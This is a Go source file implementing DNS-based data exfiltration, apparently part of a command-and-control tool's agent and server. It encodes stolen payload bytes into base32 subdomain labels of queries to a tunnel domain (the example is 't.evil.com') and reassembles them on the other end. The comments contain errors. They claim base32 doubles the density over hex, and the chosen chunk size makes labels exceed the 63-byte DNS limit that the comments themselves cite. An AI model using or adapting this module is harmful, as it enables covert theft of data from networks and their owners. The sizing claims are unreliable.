// Package dnsexfil implements DNS-based exfiltration. The agent encodes
// payload bytes into subdomain labels of queries to a domain the core is
// authoritative for. The core reads incoming queries and reassembles.
//
// Wire format for one chunk:
//
//	<seq>-<total>-<session>-<base32payload>.<tunnel.domain>
//
// Base32 is used because DNS labels are case-insensitive and base32's alphabet
// is a subset of [a-z0-9] (lowercased) with no ambiguity. Hex would work too
// but base32 doubles the ratio of bytes-per-label vs hex.
//
// Chunk size target: ~50 bytes of payload per label, so total label length
// stays under DNS's 63-byte per-label limit including framing.
package dnsexfil

import (
	"encoding/base32"
	"fmt"
	"strings"
)

const (
	// How many raw payload bytes fit in one label. Framing is
	// "NN-NN-XXXXXX-" = ~15 chars, leaving ~45 for the payload body.
	PayloadBytesPerLabel = 40
)

// Encode splits payload into DNS-query labels with framing.
// domain is the tunnel domain (e.g. "t.evil.com"); the caller appends it.
func Encode(payload []byte, sessionID, domain string) []string {
	chunks := chunk(payload, PayloadBytesPerLabel)
	total := len(chunks)
	out := make([]string, 0, total)
	for i, c := range chunks {
		enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(c)
		enc = strings.ToLower(enc)
		label := fmt.Sprintf("%d-%d-%s-%s", i, total, sessionID, enc)
		out = append(out, label+"."+domain)
	}
	return out
}

// Decode takes one DNS label (subdomain portion only) and returns the
// sequence, total, session, and payload chunk.
func Decode(label string) (seq, total int, session string, payload []byte, err error) {
	// Strip trailing dot if present
	label = strings.TrimSuffix(label, ".")
	parts := strings.SplitN(label, "-", 4)
	if len(parts) != 4 {
		return 0, 0, "", nil, fmt.Errorf("bad framing: %q", label)
	}
	if _, err := fmt.Sscanf(parts[0], "%d", &seq); err != nil {
		return 0, 0, "", nil, fmt.Errorf("bad seq: %q", parts[0])
	}
	if _, err := fmt.Sscanf(parts[1], "%d", &total); err != nil {
		return 0, 0, "", nil, fmt.Errorf("bad total: %q", parts[1])
	}
	session = parts[2]
	enc := strings.ToUpper(parts[3])
	payload, err = base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(enc)
	if err != nil {
		return 0, 0, "", nil, fmt.Errorf("base32: %w", err)
	}
	return seq, total, session, payload, nil
}

func chunk(b []byte, n int) [][]byte {
	var out [][]byte
	for i := 0; i < len(b); i += n {
		end := i + n
		if end > len(b) {
			end = len(b)
		}
		out = append(out, b[i:end])
	}
	return out
}
